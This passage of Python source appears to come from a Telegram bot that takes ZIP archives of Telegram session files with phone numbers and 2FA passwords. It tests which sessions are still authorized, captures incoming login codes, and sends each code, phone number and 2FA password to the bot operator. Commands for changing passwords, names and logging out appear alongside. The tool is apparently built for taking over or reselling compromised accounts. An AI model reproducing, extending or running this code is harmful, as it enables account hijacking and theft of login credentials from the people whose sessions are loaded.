                file_list = zip_ref.namelist()
                if len(file_list) > MAX_ZIP_ENTRIES:
                    await update.message.reply_text(
                        f"❌ ZIP file contains too many files! Maximum allowed: {MAX_ZIP_ENTRIES}\\n"
                        f"Your ZIP contains: {len(file_list)} files",
                        parse_mode=ParseMode.MARKDOWN
                    )
                    return
                
                # Check for suspicious files
                for file_name in file_list:
                    if '..' in file_name or file_name.startswith('/'):
                        await update.message.reply_text(
                            "❌ ZIP file contains suspicious file paths. Please ensure all files are in the root directory.",
                            parse_mode=ParseMode.MARKDOWN
                        )
                        return
                
                # Extract files safely
                zip_ref.extractall(temp_dir)
                
        except zipfile.BadZipFile:
            await update.message.reply_text(
                "❌ Invalid or corrupted ZIP file. Please upload a valid ZIP archive.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        except Exception as e:
            logger.error(f"Error extracting ZIP file: {e}")
            await update.message.reply_text(
                f"❌ Error processing ZIP file: {str(e)}",
                parse_mode=ParseMode.MARKDOWN
            )
            return
            
        # Find JSON files and corresponding sessions
        try:
            json_files = [f for f in os.listdir(temp_dir) if f.endswith('.json')]
            if not json_files:
                await update.message.reply_text(
                    "❌ No JSON configuration files found in ZIP archive.",
                    parse_mode=ParseMode.MARKDOWN
                )
                return
                
            for json_file in json_files:
                phone = json_file.replace('.json', '')
                session_file = f"{phone}.session"
                
                if session_file not in os.listdir(temp_dir):
                    continue
                
                # Read account data from JSON
                with open(os.path.join(temp_dir, json_file), 'r') as f:
                    account_data = json.load(f)
                
                # Create user directory if needed
                user_dir = os.path.join(SESSIONS_DIR, str(user_id))
                os.makedirs(user_dir, exist_ok=True)
                
                # Copy files to user directory
                session_path = os.path.join(user_dir, phone)
                shutil.copy2(
                    os.path.join(temp_dir, session_file),
                    f"{session_path}.session"
                )
                shutil.copy2(
                    os.path.join(temp_dir, json_file),
                    f"{session_path}.json"
                )
                
                # Validate session - only add authorized accounts
                try:
                    # Use timeout for session validation
                    test_client = TelegramClient(session_path, API_ID, API_HASH)
                    
                    # Connect with timeout
                    await asyncio.wait_for(test_client.connect(), timeout=CONNECTION_TIMEOUT)
                    
                    if await asyncio.wait_for(test_client.is_user_authorized(), timeout=CONNECTION_TIMEOUT):
                        accounts.append({
                            'phone': account_data.get('phone', phone),
                            'twofa': account_data.get('twoFA', account_data.get('twofa', '')),
                            'session_path': session_path,
                            'authorized': True
                        })
                        logger.info(f"Added authorized account: {phone}")
                    else:
                        logger.info(f"Skipping unauthorized account: {phone}")
                    
                    # Safely disconnect
                    await safe_disconnect_client(test_client, phone)
                    
                except asyncio.TimeoutError:
                    logger.error(f"Timeout validating session {phone}")
                except Exception as e:
                    logger.error(f"Error validating session {phone}: {e}")
                    
        except Exception as e:
            logger.error(f"Error processing JSON files: {e}")
            await update.message.reply_text(
                f"❌ Error processing account files: {str(e)}",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        if accounts:
            # Only process authorized accounts
            await update.message.reply_text(
                f"✅ Found {len(accounts)} authorized accounts. Starting OTP monitoring...",
                parse_mode=ParseMode.MARKDOWN
            )
            
            # Store accounts in session and start processing
            active_sessions['pending_accounts'] = accounts
            await process_next_account(user_id, context.bot)
        else:
            await update.message.reply_text(
                "❌ No authorized accounts found in the ZIP file",
                parse_mode=ParseMode.MARKDOWN
            )
            
    except Exception as e:
        await update.message.reply_text(
            f"❌ **Error processing ZIP file:** {str(e)}",
            parse_mode=ParseMode.MARKDOWN
        )
    finally:
        # Cleanup
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    data = query.data

    user_id = query.from_user.id
    bot = context.bot

    # Stop process
    if data == "stop_process":
        try:
            client = active_sessions.get('client')
            if client:
                # Remove message handler
                phone = active_sessions.get('phone')
                if phone and phone in message_handlers:
                    client.remove_event_handler(message_handlers[phone])
                    del message_handlers[phone]
                
                # Disconnect client safely
                try:
                    await client.disconnect()
                except:
                    pass
        except Exception as e:
            logger.error(f"Error cleaning up client: {e}")
        
        active_sessions.clear()
        await query.edit_message_text("🛑 Process stopped.")
        return

    # Next account
    if data == "next_account":
        await query.edit_message_text("⏭️ Moving to next account...")
        await process_next_account(user_id, bot)
        return

    # Capture OTP
    if data == "capture_otp":
        client = active_sessions.get('client')
        phone = active_sessions.get('phone')
        twofa = active_sessions.get('twofa')
        
        if client and phone:
            try:
                await query.answer("🔍 Checking for OTP messages...")
                
                # Capture the most recent OTP
                msg_text, otp_code = await capture_recent_otp()
                
                if msg_text and otp_code:
                    # Build keyboard with options
                    keyboard = InlineKeyboardMarkup([
                        [InlineKeyboardButton("Next Account", callback_data="next_account")],
                        [InlineKeyboardButton("Capture OTP", callback_data="capture_otp")],
                        [InlineKeyboardButton("Stop", callback_data="stop_process")]
                    ])

                    # Send the OTP information to the user
                    await bot.send_message(
                        chat_id=user_id,
                        text=f"🔐 **OTP Captured!**\n\n"
                             f"📱 Number: `{phone}`\n"
                             f"🔢 Login Code: `{otp_code}`\n"
                             f"🔑 2FA: `{twofa}`\n\n"
                             f"💬 Message:\n{msg_text}",
                        reply_markup=keyboard,
                        parse_mode=ParseMode.MARKDOWN
                    )
                else:
                    await query.answer("❌ No OTP found in recent messages")
                    await bot.send_message(
                        chat_id=user_id,
                        text="❌ No OTP code found in recent messages. Please try to login with this number in your Telegram app first."
                    )
            except Exception as e:
                await query.answer(f"❌ Error: {str(e)}")
        else:
            await query.answer("❌ No active session to capture OTP")
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle regular messages - for manual OTP entry"""
    # If user sends a message, check if it might be an OTP
    message_text = update.message.text
    if message_text and re.match(r'^\d{5}$', message_text.strip()):
        # Might be an OTP entered manually
        user_id = update.effective_user.id
        if user_id == active_sessions.get('current_user'):
            phone = active_sessions.get('phone')
            twofa = active_sessions.get('twofa')
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("Next Account", callback_data="next_account")],
                [InlineKeyboardButton("Stop", callback_data="stop_process")]
            ])
            
            await update.message.reply_text(
                f"🔐 **OTP Entered Manually**\n\n"
                f"📱 Number: `{phone}`\n"
                f"🔢 Login Code: `{message_text.strip()}`\n"
                f"🔑 2FA: `{twofa}`",
                reply_markup=keyboard,
                parse_mode=ParseMode.MARKDOWN
            )

async def graceful_shutdown(application):
    """Perform graceful shutdown of the bot"""
    logger.info("Starting graceful shutdown...")
    
    try:
        # Clean up active sessions
        await cleanup_active_sessions()
        
        # Stop the application
        await application.stop()
        await application.shutdown()
        
        logger.info("Graceful shutdown completed")
    except Exception as e:
        logger.error(f"Error during graceful shutdown: {e}")

def main():
    """Start the bot with proper error handling and graceful shutdown"""
    # Create directories if needed
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    
    try:
        with open('botConfigManiac.json', 'r') as f:
            config = json.load(f)
            TOKEN = config.get('BOT_TOKEN')
    except FileNotFoundError:
        logger.error("Please create botConfigManiac.json with your bot token")
        sys.exit(1)
    
    # Create application with error handling
    application = Application.builder().token(TOKEN).build()
    
    # Add error handler
    async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Log errors caused by Updates."""
        logger.error(f"Update {update} caused error {context.error}")
        
        # Try to send error message to user if possible
        if update and hasattr(update, 'effective_chat') and update.effective_chat:
            try:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="❌ An error occurred. The bot is still running, please try again.",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"Failed to send error message to user: {e}")
    
    application.add_error_handler(error_handler)
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("changepasson", changepasson))
    application.add_handler(CommandHandler("changepassoff", changepassoff))
    application.add_handler(CommandHandler("changename", changename))
    application.add_handler(CommandHandler("changenameoff", changenameoff))
    application.add_handler(CommandHandler("cleanupon", cleanupon))
    application.add_handler(CommandHandler("cleanupoff", cleanupoff))
    application.add_handler(CommandHandler("logout", logout))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_zip_upload))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Start bot with graceful shutdown handling
    logger.info("Bot starting...")
    
    # Start health check task
    async def post_init(app):
        """Initialize background tasks after bot starts"""
        asyncio.create_task(health_check())
        logger.info("Health check task started")
    
    application.post_init = post_init
    
    try:
        application.run_polling(
            drop_pending_updates=True,  # Drop pending updates on restart
            close_loop=False
        )
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt, shutting down...")
    except Exception as e:
        logger.error(f"Unexpected error in main loop: {e}")
    finally:
        # Ensure cleanup happens
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                loop.create_task(graceful_shutdown(application))
            else:
                loop.run_until_complete(graceful_shutdown(application))
        except Exception as e:
            logger.error(f"Error during final cleanup: {e}")

if __name__ == '__main__':
    main()